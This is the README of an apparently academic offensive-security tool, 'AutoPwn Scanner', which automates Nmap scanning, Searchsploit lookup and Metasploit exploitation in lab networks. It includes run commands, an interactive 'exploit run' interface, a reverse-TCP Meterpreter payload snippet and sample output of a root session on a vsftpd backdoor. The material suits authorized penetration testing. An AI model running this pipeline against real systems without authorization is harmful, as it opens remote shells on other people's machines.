# 🔍 AutoPwn Scanner

> Automated vulnerability scanning and exploitation pipeline for authorized lab environments.  
> **C++ runner · Python logic · Metasploit RPC · SQLite reporting**

![License](https://img.shields.io/badge/license-MIT-blue)
![Python](https://img.shields.io/badge/python-3.10%2B-blue)
![Platform](https://img.shields.io/badge/platform-Kali%20%7C%20Parrot-darkgreen)
![Status](https://img.shields.io/badge/status-academic%20project-orange)

---

> ⚠️ **DISCLAIMER — ETHICAL AND LEGAL USE ONLY**  
> This tool was developed exclusively for academic lab environments, CTF competitions, and networks for which you have **explicit written authorization**.  
> Unauthorized use against third-party systems is illegal under applicable computer crime laws.  
> The authors accept no responsibility for misuse.

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Project Structure](#project-structure)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Database](#database)
- [Session Monitor](#session-monitor)
- [Sample Output](#sample-output)
- [Extending the Tool](#extending-the-tool)

---

## Overview

**AutoPwn Scanner** is an offensive security pipeline that integrates three standard penetration testing tools into a single automated workflow:

| Phase | Tool | Purpose |
|-------|------|---------|
| 1 | **Nmap** | Port scanning + service version detection |
| 2 | **Searchsploit** | Public exploit lookup for discovered services |
| 3 | **Metasploit RPC** | Automatic module loading and exploit attempts |

Every result is persisted to a local **SQLite** database, and Meterpreter sessions are notified in real time by a background monitor thread.

---

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                   scanner_runner  (C++)                       │
│                                                              │
│   ┌──────────┐    ┌─────────────┐    ┌──────────────────┐   │
│   │   Nmap   │───▶│ scan_IP.xml │───▶│  Searchsploit    │   │
│   └──────────┘    └─────────────┘    └────────┬─────────┘   │
│                                               │ JSON         │
└───────────────────────────────────────────────┼─────────────┘
                                                │
                         ┌──────────────────────▼────────────┐
                         │         logic_mapper.py            │
                         │                                    │
                         │  ┌────────────┐ ┌──────────────┐  │
                         │  │ NmapParser │ │ SSFilter     │  │
                         │  └─────┬──────┘ └──────┬───────┘  │
                         │        └────────┬────────┘         │
                         │         ┌───────▼───────┐          │
                         │         │ MetasploitMgr │◀─msfrpcd │
                         │         └───────┬───────┘          │
                         │         ┌───────▼───────┐          │
                         │         │   SQLite DB   │          │
                         │         └───────────────┘          │
                         │                                    │
                         │  ┌─────────────────────────────┐  │
                         │  │ MeterpreterMonitor (thread) │  │
                         │  └─────────────────────────────┘  │
                         └────────────────────────────────────┘
```

---

## Project Structure

```
autopwn-scanner/
├── scanner_runner.cpp        # C++ runner: launches Nmap, Searchsploit, and Python
├── logic_mapper.py           # Python core: XML parsing, MSF filter, RPC, monitor
├── db_report.py              # Human-readable SQLite report
├── start_msfrpcd.sh          # Helper script to start the Metasploit RPC daemon
├── config.ini.example        # Configuration template (config.ini is in .gitignore)
├── requirements.txt          # Python dependencies
├── results/                  # Created at runtime (excluded from git)
│   ├── scan_<IP>.xml
│   ├── searchsploit_results.json
│   └── scanner.db
└── README.md
```

---

## Requirements

| Dependency | Minimum version | Notes |
|------------|----------------|-------|
| OS | Kali Linux / Parrot OS | Recommended; works on any Debian-based distro |
| Python | 3.10+ | Required for `list[dict]` type hints |
| GCC/G++ | 9+ | Must support `-std=c++17` |
| Nmap | 7.80+ | With `vulners` script included |
| Metasploit Framework | 6.x | `msfconsole`, `msfrpcd` |
| Searchsploit / ExploitDB | any | `sudo apt install exploitdb` |

---

## Installation

```bash
# 1. Clone the repository
git clone https://github.com/<your-username>/autopwn-scanner.git
cd autopwn-scanner

# 2. Install Python dependencies
pip install -r requirements.txt

# 3. Compile the C++ runner
g++ -o scanner_runner scanner_runner.cpp -std=c++17

# 4. Copy and customize the configuration
cp config.ini.example config.ini
nano config.ini
```

---

## Configuration

All sensitive settings live in `config.ini` (never committed to Git):

```ini
[metasploit]
password = change_this_password
host     = 127.0.0.1
port     = 55553

[scanner]
output_dir          = ./results
monitor_interval    = 5    # seconds between each polling cycle
post_pipeline_wait  = 10   # extra seconds after pipeline for slow staged payloads

[database]
path = ./results/scanner.db
```

> Only `config.ini.example` (with placeholder values) should be committed.  
> **Never commit `config.ini` containing your real password.**

---

## Usage

### Step 1 — Start the Metasploit RPC daemon

```bash
# In a separate terminal
bash start_msfrpcd.sh

# Or manually
msfrpcd -P change_this_password -n -f -a 127.0.0.1 -p 55553
```

### Step 2 — Run the pipeline

```bash
# Single target (sudo required for Nmap raw sockets)
sudo ./scanner_runner 192.168.1.10

# CIDR network range
sudo ./scanner_runner 192.168.1.0/24
```

The C++ runner executes in sequence:
1. `nmap -sV --script=vulners -oX results/scan_<IP>.xml <target>`
2. `searchsploit --nmap results/scan_<IP>.xml -j → results/searchsploit_results.json`
3. `python3 logic_mapper.py --xml ... --json ...`

In interactive mode, use `clear` or `cls` to reset the terminal screen.

### Interactive CLI commands

Within `./scanner_runner` interactive mode you can also use:

- `searchsploit <xml_or_target>` — run Searchsploit against an existing Nmap XML file or named target.
- `exploit list [query]` — list Metasploit exploit modules from `msfconsole`.
- `exploit show [module]` — show details for the selected exploit or a specified module.
- `exploit select <module>` — choose a module for later execution.
- `exploit run <target> [rport] [module]` — execute the selected or specified exploit module.
- `msf list [query]` — alias for `exploit list`.

### Step 3 — View results

```bash
python3 db_report.py

# With a custom database path
python3 db_report.py ./results/scanner.db
```

### Advanced options for `logic_mapper.py`

```
python3 logic_mapper.py --xml <file.xml> --json <file.json> [--monitor-interval SEC]

  --xml               Path to the Nmap XML output file
  --json              Path to the Searchsploit JSON output file
  --monitor-interval  Seconds between session monitor polls (default: 5)
```

---

## Database

The SQLite database at `results/scanner.db` contains three tables:

```sql
Targets
  id · ip · hostname · os_info · scan_time

Vulnerabilities
  id · target_id → Targets
  port · protocol · service · version
  exploit_name · exploit_path · has_msf · found_time

Exploits_Found
  id · vuln_id → Vulnerabilities
  msf_module · rhost · rport
  session_id · success · attempt_time
```

Quick query examples:

```bash
# All successful exploits
sqlite3 results/scanner.db \
  "SELECT rhost, msf_module, session_id FROM Exploits_Found WHERE success=1;"

# Vulnerabilities with an available MSF module
sqlite3 results/scanner.db \
  "SELECT t.ip, v.port, v.service, v.exploit_name
   FROM Vulnerabilities v JOIN Targets t ON v.target_id=t.id
   WHERE v.has_msf=1;"
```

---

## Session Monitor

`MeterpreterMonitor` runs as a daemon thread throughout the entire pipeline.  
When a new session is detected, it prints a colored banner to stdout:

```
╔══════════════════════════════════════════════╗
║  ★  METERPRETER SESSION                      ║
╠══════════════════════════════════════════════╣
║  Session ID : 1                              ║
║  Target     : 192.168.1.50                   ║
║  Type       : meterpreter                    ║
║  Platform   : linux / x86_64                 ║
║  User       : root                           ║
║  Module     : exploits/unix/ftp/vsftpd_234   ║
║  Time       : 14:32:07                       ║
╚══════════════════════════════════════════════╝
```

| Session type | Icon | Color |
|---|---|---|
| `meterpreter` | ★ | Green |
| `shell` | ✓ | Yellow |
| other | ~ | Cyan |

Sessions are automatically recorded in the database even if not launched directly by the pipeline (e.g. a manual exploit running in parallel).

---

## Sample Output

```
==============================================
   Security Scanner Runner (C++) - Lab
==============================================

[NMAP] Starting scan on: 192.168.1.50
[NMAP] XML output -> ./results/scan_192.168.1.50.xml
[SEARCHSPLOIT] Parsing XML...
[PYTHON-BRIDGE] Invoking logic_mapper.py

══════════════════════════════════════════════
  LOGIC MAPPER – Pipeline started
══════════════════════════════════════════════

[MONITOR] Started. Polling every 5s.
[DB] Connected to: ./results/scanner.db
[PARSER] Hosts found: 1
[MSF] Connected to msfrpcd at 127.0.0.1:55553

[MAPPER] Host: 192.168.1.50 (metasploitable) OS: Linux 2.6.x
  ↳ Port 21/tcp: ftp vsftpd 2.3.4
    → Attempting MSF: exploits/unix/ftp/vsftpd_234_backdoor
[MSF] Launching: exploits/unix/ftp/vsftpd_234_backdoor → 192.168.1.50:21

★  METERPRETER SESSION  [ID: 1 | 192.168.1.50]  ★

[MAPPER] Waiting 10s for delayed sessions...
[MONITOR] Stopped.
[MAPPER] Pipeline complete. Data saved to DB.
```

---

## Extending the Tool

**Custom Nmap flags** — edit `NmapRunner::run()` in `scanner_runner.cpp`:
```cpp
// Full port scan with OS detection
"nmap -A -p- --script=vulners -oX " + output_xml + " " + target
```

**Different Metasploit payload** — edit `MetasploitManager.run_exploit()`:
```python
# Switch to a stageless Windows x64 Meterpreter
payload = self.client.modules.use("payload", "windows/x64/meterpreter_reverse_tcp")
```

**External notifications from MeterpreterMonitor** — extend `_notify()`:
```python
import requests
requests.post("https://hooks.slack.com/...", json={"text": f"Session opened on {rhost}!"})
```

**Export report as JSON**:
```python
# In db_report.py, replace print() with json.dump() for machine-readable output
```
